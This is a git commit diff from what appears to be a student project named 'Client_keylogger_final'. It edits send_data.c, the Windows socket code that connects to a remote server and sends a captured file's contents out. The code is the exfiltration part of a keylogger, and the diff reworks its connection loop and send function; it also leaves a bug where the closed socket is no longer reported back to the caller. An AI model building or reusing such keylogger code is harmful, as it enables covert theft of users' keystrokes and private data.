ddaeb936ec928a1ab7fedbd0dd320d37aef4c186
kevin.tavukciyan <kevin.tavukciyan@epitech.eu>
2016-04-18 10:37:16 +0200

    revert a dernier truc qui marche

--- Client_keylogger_final/send_data.c
+++ Client_keylogger_final/send_data.c
@@ -14,59 +14,56 @@ SOCKET	init_socket(SOCKET *my_sock)
 		printf("getaddrinfo failed\n");
 		return (*my_sock);
 	}
-	while (*my_sock == INVALID_SOCKET)
+	for (result = ptr; result != NULL; result = result->ai_next)
 	{
-		for (result = ptr; result != NULL; result = result->ai_next)
+		if ((*my_sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol)) == INVALID_SOCKET)
 		{
-			if ((*my_sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol)) == INVALID_SOCKET)
+			printf("socket failed\n");
+			return (*my_sock);
+		}
+		if (connect(*my_sock, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR)
+		{
+			if (shutdown(*my_sock, SD_BOTH) == SOCKET_ERROR)
 			{
-				printf("socket failed\n");
+				printf("failed shutdown\n");
+				closesocket(*my_sock);
 				return (*my_sock);
 			}
-			if (connect(*my_sock, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR)
-			{
-				/*			if (shutdown(*my_sock, SD_BOTH) == SOCKET_ERROR)
-							{
-								printf("failed shutdown\n");
-								closesocket(*my_sock);
-								return (*my_sock);
-							}*/
-				closesocket(*my_sock);
-				*my_sock = INVALID_SOCKET;
-				continue;
-			}
-			break;
+			closesocket(*my_sock);
+			*my_sock = INVALID_SOCKET;
+			continue;
 		}
+		break;
 	}
-	freeaddrinfo(ptr);
+	freeaddrinfo(result);
 	if ((ioctlsocket(*my_sock, FIONBIO, &io)) != NO_ERROR)
 		WSAGetLastError();
 	return (*my_sock);
 }
 
-void	send_data(SOCKET *my_sock, FILE *fd)
+void	send_data(SOCKET my_sock, FILE *fd)
 {
 	char buf[BUFFSIZE];
 	int i;
 
 	i = 0;
 	SecureZeroMemory(buf, BUFFSIZE);
-	if (*my_sock == INVALID_SOCKET)
+	if (my_sock == INVALID_SOCKET)
 		return;
 	if ((fseek(fd, 0, SEEK_SET)) == -1)
 		return;
 	while ((i = _read(_fileno(fd), buf, BUFFSIZE)) > 0)
 	{
-		if (send(*my_sock, buf, i, 0) == SOCKET_ERROR)
+		if (send(my_sock, buf, i, 0) == SOCKET_ERROR)
 		{
 			printf("failed send\n");
-			closesocket(*my_sock);
-			*my_sock = INVALID_SOCKET;
+			closesocket(my_sock);
+			my_sock = INVALID_SOCKET;
 			return;
 		}
 		SecureZeroMemory(buf, BUFFSIZE);
 	}
-	while (recv(*my_sock, buf, BUFFSIZE, 0) > 0)
+	while (recv(my_sock, buf, BUFFSIZE, 0) > 0)
 	{
 		SecureZeroMemory(buf, BUFFSIZE);
 	}
